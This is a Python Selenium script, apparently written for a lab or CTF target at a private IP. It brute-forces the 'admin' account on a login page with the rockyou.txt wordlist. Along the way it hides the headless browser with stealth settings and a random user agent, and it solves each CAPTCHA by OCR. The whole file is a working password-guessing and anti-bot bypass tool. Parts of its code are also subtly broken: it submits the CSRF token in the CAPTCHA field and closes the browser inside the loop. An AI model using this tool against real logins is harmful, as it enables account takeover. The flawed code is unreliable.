

from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from selenium_stealth import stealth

import time
from fake_useragent import UserAgent
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract
import io
import os

from курсовик.brute import password_list

# Create folder for saving CAPTCHA images
os.makedirs("captchas", exist_ok=True)

options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--headless')
options.add_argument("start-maximized")
options.set_preference('general.useragent.override', userAgent)
options.add_argument('permissions.default.image', 2)
options.set_preference('dom.webnotifications.enabled', False)

options.binary_location = "/usr/local/bin/firefox"
service = Service(executable_path='/usr/bin/geckodriver')
firefox = webdriver.Firefox(service=service, options=options)

stealth(firefox,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine", fix_hairline=True,
)

ip =  "http://10.80.148.255/"
login_url = f"{ip}/index.php"
dashboard_url = f"{ip}/dashboard.php"

user = 'admin'
with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    password_list = [line.strip() for line in f]


for password in password_list:
    while True:
        firefox.get(ip)
        time.sleep(1)
        csrf = firefox.find_element(By.NAME, "csrf_token").get_attribute("value")
        captcha_img = firefox.find_element(By.TAG_NAME, "img")
        captcha_png = captcha_img.screenshot_as_png

        image = Image.open(io.BytesIO(captcha_png)).convert("L")
        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)  # Resize fo>
        image = image.filter(ImageFilter.SHARPEN)
        image = ImageEnhance.Contrast(image).enhance(2.0)
        image = image.point(lambda x: 0 if x < 140 else 255, '1')

        captcha_text = pytesseract.image_to_string(
            image,
            config ='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
        ).strip().replace("","").replace("\n","").upper()

        image.save(f"captchas/captcha_{password}_{captcha_text}.png")

        if not captcha_text.isalnum() or len(captcha_text)  != 5:
            print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
            continue

        print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")

        firefox.find_element(By.NAME, "username").send_keys(user)
        firefox.find_element(By.NAME, "password").send_keys(password)
        firefox.find_element(By.NAME, "captcha_input").send_keys(csrf)
        firefox.find_element(By.TAG_NAME, "form").submit()

        time.sleep(1)
        print("=== HTML Output After Submit ===")
        print(firefox.page_source)
        print("================================")

        if dashboard_url in firefox.current_url:
            print(f"[+] Login successful with password: {password}")
            break
        else:
            print(f"[-] Failed login with: {password}")
            break  # try next password

    firefox.quit()